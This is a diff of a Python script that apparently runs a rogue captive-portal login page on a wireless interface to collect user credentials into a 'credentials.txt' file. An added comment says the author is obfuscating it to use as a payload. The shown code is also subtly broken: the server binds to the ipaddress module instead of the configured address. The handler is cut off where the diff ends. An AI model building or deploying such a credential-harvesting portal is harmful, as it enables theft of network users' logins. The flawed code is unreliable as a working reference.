@@ -2,74 +2,54 @@
 #I had to make a decision at some point to python3
 #in the interest of the future , i choose python3
 #need to update the names in whatever portal you are using
+# Working on obfuscating the everloving shit out of this and using it as a payload.
 import subprocess
-
 from http.server import HTTPServer as Webserver
 import http.server
-
 #try:
 #    from urllib.parse import urlparse
 #except ImportError:
 #    from urlparse import urlparse
-
 try:
     import SocketServer as socketserver
 except ImportError:
     import socketserver as socketserver
-
 import ipaddress
-
 import colorama
-
 from colorama import init
 init()
 from colorama import Fore, Back, Style
-
 def blueprint(text):
     print(Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL)
-
 def greenprint(text):
     print(Fore.GREEN + ' ' +  text + ' ' + Style.RESET_ALL)
-
 def redprint(text):
     print(Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL)
-
 import cgitb
 import cgi
 import os
 import re
 # These variables are used as settings
 #set to your appropriate ifaces
-moniface        = 'eth0'
-iface           = 'eth1'
-PORT       = 9090         # the port in which the captive portal web server listens
-IFACE      = "wlan2"      # the interface that captive portal protects
-IP_ADDRESS = "192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
-filename        = 'credentials.txt'
-
+moniface,iface='eth0','eth1'
+PORT=9090         # the port in which the captive portal web server listens
+IFACE="wlan2"      # the interface that captive portal protects
+IP_ADDRESS="192.168.0.1" # the ip address of the captive portal (it can be the IP of IFACE)
+filename='credentials.txt'
 global remote_IP
-hostlist        = []
-networkaddrpool = []
-
-i1name = 'username'
-i2name = 'email'
-i3name = 'submit'
-
+hostlist , networkaddrpool = [] , []
+i1name, i2name,i3name  = 'username' , 'email' , 'submit'
 portalpage = '/portal/login.php.html'
 credentials = [[ 'nikos' , 'fotiou'] , # please keep this here at least commented, its to cite them.
                 ['user1' , 'password'],
                 ['user2' , 'password2'],
                 ['hacker' , 'root']]
-
 def serveportal():
     httpd = http.server.HTTPServer((ipaddress, PORT), CaptivePortal)
     try:
-
         httpd.serve_forever()
     except KeyboardInterrupt:
         pass
-
-
 class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     #this is the index of the captive portal
     #it simply redirects the user to the to login page
